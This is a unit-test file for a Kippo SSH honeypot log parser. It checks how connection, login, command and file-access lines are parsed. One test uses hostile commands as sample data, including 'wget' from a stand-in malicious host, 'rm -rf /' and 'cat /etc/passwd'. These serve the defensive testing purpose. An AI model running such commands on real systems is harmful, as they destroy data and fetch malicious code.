"""
Unit tests for KippoLogParser service.
"""

import pytest
import tempfile
import os
from datetime import datetime
from src.honeypot_monitor.services.log_parser import KippoLogParser, ParseError
from src.honeypot_monitor.models.log_entry import LogEntry


class TestKippoLogParser:
    """Test cases for KippoLogParser class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.parser = KippoLogParser()
    
    def test_init(self):
        """Test parser initialization."""
        assert self.parser is not None
        assert len(self.parser._patterns) > 0
        assert len(self.parser.get_supported_formats()) > 0
    
    def test_get_supported_formats(self):
        """Test getting supported formats."""
        formats = self.parser.get_supported_formats()
        assert isinstance(formats, list)
        assert 'kippo_default' in formats
        assert 'kippo_json' in formats
        assert 'kippo_syslog' in formats
    
    def test_parse_connection_entry(self):
        """Test parsing connection log entries."""
        log_line = "2024-01-15 10:30:45+0000 [SSHService ssh-connection] connection from 192.168.1.100:12345"
        
        entry = self.parser.parse_entry(log_line)
        
        assert isinstance(entry, LogEntry)
        assert entry.event_type == 'connection'
        assert entry.source_ip == '192.168.1.100'
        assert entry.message == log_line
        assert isinstance(entry.timestamp, datetime)
    
    def test_parse_auth_success_entry(self):
        """Test parsing successful authentication entries."""
        log_line = "2024-01-15 10:31:00+0000 [SSHService ssh-connection] login attempt [root/password123] succeeded"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.event_type == 'authentication'
        assert entry.source_ip == '0.0.0.0'  # Default when not specified
        assert entry.message == log_line
    
    def test_parse_auth_failure_entry(self):
        """Test parsing failed authentication entries."""
        log_line = "2024-01-15 10:31:05+0000 [SSHService ssh-connection] login attempt [admin/admin] failed"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.event_type == 'authentication'
        assert entry.message == log_line
    
    def test_parse_command_entry(self):
        """Test parsing command execution entries."""
        log_line = "2024-01-15 10:32:00+0000 [SSHChannel session] CMD: ls -la /home"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.event_type == 'command'
        assert entry.command == 'ls -la /home'
        assert entry.message == log_line
    
    def test_parse_file_download_entry(self):
        """Test parsing file download entries."""
        log_line = "2024-01-15 10:33:00+0000 [SSHChannel session] file download: /etc/passwd"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.event_type == 'file_access'
        assert entry.file_path == '/etc/passwd'
        assert entry.message == log_line
    
    def test_parse_file_upload_entry(self):
        """Test parsing file upload entries."""
        log_line = "2024-01-15 10:34:00+0000 [SSHChannel session] file upload: /tmp/malware.sh"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.event_type == 'file_access'
        assert entry.file_path == '/tmp/malware.sh'
        assert entry.message == log_line
    
    def test_parse_session_start_entry(self):
        """Test parsing session start entries."""
        log_line = "2024-01-15 10:30:00+0000 [SSHService ssh-connection] New connection: 192.168.1.100:12345 (session123)"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.event_type == 'login'
        assert entry.source_ip == '192.168.1.100'
        assert entry.session_id == 'session123'
        assert entry.message == log_line
    
    def test_parse_session_end_entry(self):
        """Test parsing session end entries."""
        log_line = "2024-01-15 10:35:00+0000 [SSHService ssh-connection] Connection lost: 192.168.1.100:12345 (session123)"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.event_type == 'logout'
        assert entry.source_ip == '192.168.1.100'
        assert entry.session_id == 'session123'
        assert entry.message == log_line
    
    def test_parse_generic_entry(self):
        """Test parsing generic log entries that don't match specific patterns."""
        log_line = "2024-01-15 10:36:00+0000 [SSHService ssh-connection] Some other log message"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.event_type == 'system'
        assert entry.message == log_line
    
    def test_parse_empty_line(self):
        """Test parsing empty lines raises ParseError."""
        with pytest.raises(ParseError):
            self.parser.parse_entry("")
        
        with pytest.raises(ParseError):
            self.parser.parse_entry("   ")
    
    def test_parse_invalid_format(self):
        """Test parsing invalid format raises ParseError."""
        with pytest.raises(ParseError):
            self.parser.parse_entry("This is not a valid Kippo log line")
    
    def test_parse_malformed_timestamp(self):
        """Test parsing entries with malformed timestamps."""
        log_line = "invalid-timestamp [SSHService ssh-connection] connection from 192.168.1.100:12345"
        
        # Should not raise error, but use fallback timestamp
        entry = self.parser.parse_entry(log_line)
        assert isinstance(entry.timestamp, datetime)
    
    def test_validate_format_valid_file(self):
        """Test format validation with valid log file."""
        # Create temporary file with valid Kippo log content
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            f.write("2024-01-15 10:30:45+0000 [SSHService ssh-connection] connection from 192.168.1.100:12345\n")
            f.write("2024-01-15 10:31:00+0000 [SSHService ssh-connection] login attempt [root/password] succeeded\n")
            temp_path = f.name
        
        try:
            assert self.parser.validate_format(temp_path) is True
        finally:
            os.unlink(temp_path)
    
    def test_validate_format_invalid_file(self):
        """Test format validation with invalid log file."""
        # Create temporary file with invalid content
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            f.write("This is not a valid Kippo log file\n")
            f.write("Another invalid line\n")
            temp_path = f.name
        
        try:
            assert self.parser.validate_format(temp_path) is False
        finally:
            os.unlink(temp_path)
    
    def test_validate_format_empty_file(self):
        """Test format validation with empty file."""
        # Create empty temporary file
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            temp_path = f.name
        
        try:
            assert self.parser.validate_format(temp_path) is False
        finally:
            os.unlink(temp_path)
    
    def test_validate_format_nonexistent_file(self):
        """Test format validation with non-existent file."""
        assert self.parser.validate_format("/nonexistent/file.log") is False
    
    def test_validate_format_mixed_content(self):
        """Test format validation with mixed valid/invalid content."""
        # Create temporary file with mixed content
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            f.write("Invalid line\n")
            f.write("2024-01-15 10:30:45+0000 [SSHService ssh-connection] connection from 192.168.1.100:12345\n")
            f.write("Another invalid line\n")
            temp_path = f.name
        
        try:
            # Should return True if at least one line is parseable
            assert self.parser.validate_format(temp_path) is True
        finally:
            os.unlink(temp_path)
    
    def test_session_id_generation(self):
        """Test session ID generation for entries without explicit session ID."""
        log_line = "2024-01-15 10:30:45+0000 [SSHService ssh-connection] connection from 192.168.1.100:12345"
        
        entry = self.parser.parse_entry(log_line)
        
        assert entry.session_id is not None
        assert entry.session_id != 'unknown'
        assert 'ssh-' in entry.session_id
    
    def test_timestamp_parsing_variations(self):
        """Test parsing various timestamp formats."""
        test_cases = [
            "2024-01-15 10:30:45+0000",
            "2024-01-15 10:30:45-0500",
            "2024-12-31 23:59:59+0100"
        ]
        
        for timestamp in test_cases:
            log_line = f"{timestamp} [SSHService ssh-connection] connection from 192.168.1.100:12345"
            entry = self.parser.parse_entry(log_line)
            assert isinstance(entry.timestamp, datetime)
    
    def test_ip_address_variations(self):
        """Test parsing various IP address formats."""
        test_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "203.0.113.1"
        ]
        
        for ip in test_ips:
            log_line = f"2024-01-15 10:30:45+0000 [SSHService ssh-connection] connection from {ip}:12345"
            entry = self.parser.parse_entry(log_line)
            assert entry.source_ip == ip
    
    def test_command_variations(self):
        """Test parsing various command formats."""
        test_commands = [
            "ls -la",
            "cat /etc/passwd",
            "wget http://malicious.com/script.sh",
            "rm -rf /",
            "ps aux | grep ssh"
        ]
        
        for command in test_commands:
            log_line = f"2024-01-15 10:30:45+0000 [SSHChannel session] CMD: {command}"
            entry = self.parser.parse_entry(log_line)
            assert entry.command == command
            assert entry.event_type == 'command'


class TestParseError:
    """Test cases for ParseError exception."""
    
    def test_parse_error_creation(self):
        """Test ParseError exception creation."""
        error = ParseError("Test error message")
        assert str(error) == "Test error message"
    
    def test_parse_error_inheritance(self):
        """Test ParseError inherits from Exception."""
        error = ParseError("Test error")
        assert isinstance(error, Exception)